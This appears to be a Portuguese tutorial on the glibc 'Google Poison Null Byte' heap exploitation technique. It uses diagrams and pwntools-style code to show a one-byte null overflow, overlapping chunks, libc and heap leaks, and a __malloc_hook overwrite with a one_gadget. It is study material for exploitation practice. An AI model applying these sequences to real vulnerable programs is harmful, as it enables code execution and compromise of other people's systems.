# Google Poison Null Byte

- [Google Poison Null Byte](#google-poison-null-byte)
- [Prerrequisitos](#prerrequisitos)
- [Ataque](#ataque)
- [Resumo](#resumo)
- [info leaks](#info-leaks)
  - [Libc](#libc)
  - [Heap](#heap)
  - [Full](#full)
- [Exec](#exec)
  - [Fastbin](#fastbin)
  - [House of Orange](#house-of-orange)

Essa tecnica se parece com a House of Einherjar, porem nela nos 
precisávamos usar null bytes no `prev_size` e dado que overflows 
de Null Byte tendem a ocorres com strings, nos nao poderíamos 
usa-los.

Assim, essa tecnica é mais realista, ja que leva badchars em 
consideração. Portanto, ela ja foi usada em múltiplos ataques na 
vida real.

Alem disso, eles se diferenciam pois nessa tecnica o nosso Null 
byte corrompe o `size` de um `FREE chunk`... Portanto, essa 
tecnica busca criar um overlap entre dois chunks

# Prerrequisitos 
Os prerrequisitos dessa tecnica para o chunk vitima sao o sao o 
oposto da House of Einherjar:

- chunk overflow
  - Qualquer size 
  - overflow de 1 Null Byte 
- chunk vitima 
  - FREE 
  - `size` > `0x100`
  - `size` **NAO!!!** terminado em `0x00`. Ex: `0x410`, `0x3a0`... 
- chunk consolidação
  - Tamanho que permita consolidação: `size` >= `0x90`
- Um chunk qualquer para prevenir consolidação com o TOP

# Ataque

```py
chunk_A = malloc(0x18)  # chunk overflow: qualquer tamanho 
chunk_B = malloc(0x308) # chunk vitima: 0x310 
chunk_C = malloc(0x98)  # chunk consolidação: size >= 0x90
chunk_D = malloc(0x98)  # Prevenir consolidação TOP

free(chunk_B)


OBS: Caso o libc tenha "prev vs prev size" (> 2.26) :
  Precisaríamos forjar um PREV_SIZE falso pro chunk_B
  (ele deve ficar na posição do prev_size caso o chunk_B ja 
  tivesse sido reduzido (pad = 0x300-0x10))

  edit(chunk_B, "\x00"*0x2f0 + p16(0x300))
  free(chunk_B)

Para simplificar, vamos assumir uma versão mais antiga do libc
  

 _______________  chunk_A
|               |
|               |
|_______________| chunk_B
|       | 0x311 |  FREE: UNSORTED
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

edit(chunk_A, 0x18*b"A")  # vamos assumir que o programa coloque o 
                          # NULL ao final automaticamente

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B
| AAAAA | 0x300 |  FREE: UNSORTED
|               |  SIZE ALTERADO PARA 0x300 (-0x10)
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Assim, o chunk vitima teve seu tamanho diminuído em: mod 0x100

Vamos chamar essa diferença de DIFF

Por exemplo: 
  0x310 -> 0x300    DIFF=0x10
  0X4a0 -> 0x400    DIFF=0xa0
  ...               DIFF=(size mod 0x100)

Essa diferença ira gerar muitos problemas!

Agora, vamos alocar um chunk que divida o B por meio de remainder

chunk_B1 = malloc(0xf8) # 0x100 por exemplo, mas poderia ser também
                        # 0x110, 0x120, ..., 0x200,...

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | 
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| resto do chunk_B
|       | 0x201 | FREE: UNSORTED
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |       |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|


Nao atualizou o prev_size do chunk_C como deveria, pois
deu write num endereço 0x10 (DIFF) antes do correto  
(Justamente no Espaço bugado de tamanho DIFF)

Então o prev_size do chunk_C continua = 0x310


Agora, vamos alocar um chunk que gaste o "resto do chunk_B"

chunk_B2 = malloc(0x1f8) # 0x200

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | 
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_B2
|       | 0x201 |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |   1   |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Assim como no anterior, errou a mira por 0x10 (DIFF)!

Dessa vez, nao atualiza o PREV_IN_USE do C


Portanto, por causa do PREV_USE e PREV_SIZE errados, 
se free(chunk_C), ele vai consolidar com chunk_B1 (que tem o mesmo 
endereço que o chunk_B), pois acredita que ele esta FREE


Assim, teríamos que forjar fd e bk no chunk_B1, para que ele 
passe o safe unlink! Mas nos precisaríamos de um heap leak e 
da habilidade de escrever NULLBYTES 

Para burlar isso, vamos simplesmente dar free() nele, gerando 
pointers legítimos

free(chunk_B1)

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | FREE: UNSORTED
|   FD  |   BK  | FD e BK legítimos
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_B2
|       | 0x200 | PREV_USE = 0 (porem nao importa)
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |   1   |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Agora podemos chamar free no chunk_C, consolidando com o chunk_B1

free(chunk_C)

Da perspectiva do MALLOC temos:
 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1 + chunk_C
| AAAAA | 0x401 | FREE: UNSORTED
|   FD  |   BK  | 
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Porem nos sabemos que o chunk_B2 continua ali! Criando um overlap

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1 + chunk_C
| AAAAA | 0x401 | FREE: UNSORTED
|   FD  |   BK  | 
|               |
|               |
|               |
|               |
|               |
|. . . . . . . .| chunk_B2               
|               |
|               |
|               |
|               | 
|               |
|               |
|               |
|               |
|. . . . . . . .|
|               |
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

E lembrando que, a nao ser que CALLOC tenha sido usado, ainda 
existe um monte de metadados largados la no meio (por exemplo, no 
espaço DIFF), ou os próprios pointers do chunk_B2

```

# Resumo
```py
# Google Poison Null

chunk_A = malloc(0x88)   # Qualquer size
chunk_B = malloc(0x108)  # Size: 0x110 -> 0x100
chunk_C = malloc(0x88)   # Size normal
chunk_TOP = malloc(0x88) # Prevenir Consolidação

#edit(chunk_B, "\x00"*0xf0 + p16(0x100)) # size vs prev size
free(chunk_B)
edit(chunk_A, b"\x00"*0x88) # NULL Overflow: Diff=0x10, prev_use=0

chunk_B1 = malloc(0x88)
chunk_B2 = malloc(0x68)

free(chunk_B1)
free(chunk_C)
```

# info leaks

> Essas técnicas também funcionam para a House of Einherjar

## Libc
Para um libc leak, basta alocar a primeira metade do `chunk_B + chunk_C`

```py
chunk_B1 = malloc(0x88)
```

Os metadados vao parar no chunk_B2, então basta ler o `fd` ou `bk` dele

```py
chunk_B1 = malloc(0x88)
libc_leak = u64(read(chunk_B2, 8))
```

## Heap

Para o heap precisamos fazer a mesma coisa que o libc, porem se dermos `free()` em algum chunk 
que va para os **UNSORTED**, o chunk_B2.`bk` vai apontar para ele

Assim, no read do chunk_B2, vamos precisar separar os dois:

```py
leak = read(chunk_B2, 16)
free()

libc_leak = u64(leak[:8]) # fd -> main_arena unsorted bins
heap_leak = u64(leak[8:]) # bk -> heap_leak
```

A opção mais fácil é o chunk_A, pq o endereço dele é o mesmo do heap nesse caso

```py
chunk_B1 = malloc(0x88)
free(chunk_A)

leak = read(chunk_B2, 16)

libc_leak = u64(leak[:8]) # fd -> main_arena unsorted bins
heap_leak = u64(leak[8:]) # bk -> chunk_A
```

## Full
Assim, unindo todos os infoleaks
```py
# Google Poison Null

chunk_A = malloc(0x88)   # Qualquer size
chunk_B = malloc(0x108)  # Size: 0x110 -> 0x100
chunk_C = malloc(0x88)   # Size normal
chunk_TOP = malloc(0x88) # Prevenir Consolidação

#edit(chunk_B, "\x00"*0xf0 + p16(0x100)) # size vs prev size
free(chunk_B)
edit(chunk_A, b"\x00"*0x88) # NULL Overflow: Diff=0x10, prev_use=0

chunk_B1 = malloc(0x88)
chunk_B2 = malloc(0x68)

free(chunk_B1)
free(chunk_C)

# Info leaks

chunk_B1 = malloc(0x88)
free(chunk_A) # unsorted bins -> heap leak

leak = read(chunk_B2, 16)
libc_leak = u64(leak[:8]) # fd -> main_arena unsorted bins
heap_leak = u64(leak[8:]) # bk -> chunk_A

libc.address = libc_leak - libc.sym.main_arena - 88
#log.success("Libc Addr (pwndbg: vmmap libc ou libs): "+ hex(libc.sym.__malloc_hook))
#log.success("Heap: "+hex(heap_leak))
```

# Exec
## Fastbin
Para conseguir execução, costuma-se apos os infoleaks, usar 
`find_fake_fast` no pwntools no `__malloc_hook` e corrompe-lo com 
um one gadget... como se fosse um fastbin dup

Normalmente, sera um chunk 0x70

```py
# Google Poison Null
  - sem alterações

# Info leaks
  - sem alterações

# Exec: fastbin

chunk_A = malloc(0x88) # Pegar o chunk_A de volta para ele nao atrapalhar 
chunk_fast = malloc(0x68) # 0x70 fastbin: overlap chunk_B2

free(chunk_fast)
edit(chunk_B2, p64(libc.sym.__malloc_hook - 35)) # find_fake_fast

chunk_fast = malloc(0x68) # consumir
chunk_hook = malloc(0x68) # __malloc_hook

edit(chunk_hook, b"\x00"*19 + p64(ONE_GADGET))

malloc() # ativar o one_gadget
```
## House of Orange

Apesar de mais complicado e menos confiável 
(somente funciona 50% das vezes), voce também pode usa-la!

```py
# Google Poison Null
  - sem alterações

# Info leaks
  - sem alterações

# Exec: House of Orange

```